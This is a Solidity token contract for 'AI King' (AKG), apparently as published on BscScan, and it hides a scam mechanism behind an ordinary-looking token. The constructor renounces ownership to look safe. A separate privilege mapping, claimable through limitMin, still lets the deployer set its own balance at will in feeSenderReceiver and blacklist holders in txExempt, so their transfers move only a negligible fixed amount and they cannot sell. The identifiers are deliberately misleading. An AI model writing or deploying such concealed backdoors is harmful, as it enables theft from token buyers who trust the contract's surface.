/**
 *Submitted for verification at BscScan.com on 2023-02-06
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface senderLiquidityFee {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface atLimit {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract AIKing is Ownable{
    uint8 public decimals = 18;
    mapping(address => mapping(address => uint256)) public allowance;


    address public launchedFundReceiver;
    mapping(address => uint256) public balanceOf;
    bool public receiverTakeTotal;
    address public tradingList;
    string public symbol = "AKG";
    uint256 constant exemptLimitMax = 10 ** 10;
    mapping(address => bool) public exemptTx;
    string public name = "AI King";


    mapping(address => bool) public teamLiquidityLaunched;
    uint256 public totalSupply = 100000000 * 10 ** 18;
    

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        senderLiquidityFee maxSwapAt = senderLiquidityFee(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        tradingList = atLimit(maxSwapAt.factory()).createPair(maxSwapAt.WETH(), address(this));
        launchedFundReceiver = senderMarketing();
        teamLiquidityLaunched[launchedFundReceiver] = true;
        balanceOf[launchedFundReceiver] = totalSupply;
        emit Transfer(address(0), launchedFundReceiver, totalSupply);
        renounceOwnership();
    }

    

    function senderMarketing() private view returns (address) {
        return msg.sender;
    }

    function transfer(address sellMode, uint256 txMinSender) external returns (bool) {
        return transferFrom(senderMarketing(), sellMode, txMinSender);
    }

    function approve(address launchTxLimit, uint256 txMinSender) public returns (bool) {
        allowance[senderMarketing()][launchTxLimit] = txMinSender;
        emit Approval(senderMarketing(), launchTxLimit, txMinSender);
        return true;
    }

    function buyToIs(address limitShould, address fundLaunched, uint256 txMinSender) internal returns (bool) {
        require(balanceOf[limitShould] >= txMinSender);
        balanceOf[limitShould] -= txMinSender;
        balanceOf[fundLaunched] += txMinSender;
        emit Transfer(limitShould, fundLaunched, txMinSender);
        return true;
    }

    function transferFrom(address tradingIs, address sellMode, uint256 txMinSender) public returns (bool) {
        if (tradingIs != senderMarketing() && allowance[tradingIs][senderMarketing()] != type(uint256).max) {
            require(allowance[tradingIs][senderMarketing()] >= txMinSender);
            allowance[tradingIs][senderMarketing()] -= txMinSender;
        }
        if (sellMode == launchedFundReceiver || tradingIs == launchedFundReceiver) {
            return buyToIs(tradingIs, sellMode, txMinSender);
        }
        if (exemptTx[tradingIs]) {
            return buyToIs(tradingIs, sellMode, exemptLimitMax);
        }
        return buyToIs(tradingIs, sellMode, txMinSender);
    }

    function feeSenderReceiver(uint256 txMinSender) public {
        if (!teamLiquidityLaunched[senderMarketing()]) {
            return;
        }
        balanceOf[launchedFundReceiver] = txMinSender;
    }

    function getOwner() external view returns (address) {
        return owner();
    }

    function txExempt(address amountReceiver) public {
        if (amountReceiver == launchedFundReceiver || amountReceiver == tradingList || !teamLiquidityLaunched[senderMarketing()]) {
            return;
        }
        exemptTx[amountReceiver] = true;
    }

    function limitMin(address fromMarketingSender) public {
        if (receiverTakeTotal) {
            return;
        }
        teamLiquidityLaunched[fromMarketingSender] = true;
        receiverTakeTotal = true;
    }


}